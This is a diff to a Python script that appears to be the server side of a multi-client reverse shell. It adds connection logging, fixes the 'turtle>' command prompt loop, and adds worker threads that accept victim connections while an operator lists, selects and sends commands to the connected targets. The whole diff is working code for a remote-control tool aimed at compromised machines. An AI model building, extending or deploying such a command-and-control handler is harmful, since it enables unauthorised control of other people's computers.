@@ -55,6 +55,7 @@ def accepting_connections():
     while True:
         try:
             conn, address = s.accept()
+            print("Connection has been established " + address[0] + " | Port" + str(address[1]))
             #This prevents timeouts from connection with server
             s.setblocking(1)
 
@@ -70,8 +71,8 @@ def accepting_connections():
 #Interactive prompt for sending commands
 
 def start_turtle():
-    cmd = input('turtle>')
     while True:
+        cmd = input('turtle>')
         if cmd == 'list:':
             list_connections()
         elif 'select' in cmd:
@@ -132,4 +133,33 @@ def send_target_commands(conn):
             print("Error sending commands")
             break
 
+#creating worker threads
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        #.Thread takes a function as a parameter to specify what process to do depending on which thread is being called
+        t = threading.Thread(target=work)
+        #t.daemon releases the alotted memory if the program is terminated
+        t.daemon = True
+        t.start()
 
+
+#Do next job that is in the queue (1st thread: handle connections, 2nd thread:send commands)
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            socket_creation()
+            bind_socket()
+            accepting_connections()
+        if x == 2:
+            start_turtle()
+
+        queue.task_done()
+
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+    queue.join()
+
+create_workers()
+create_jobs()
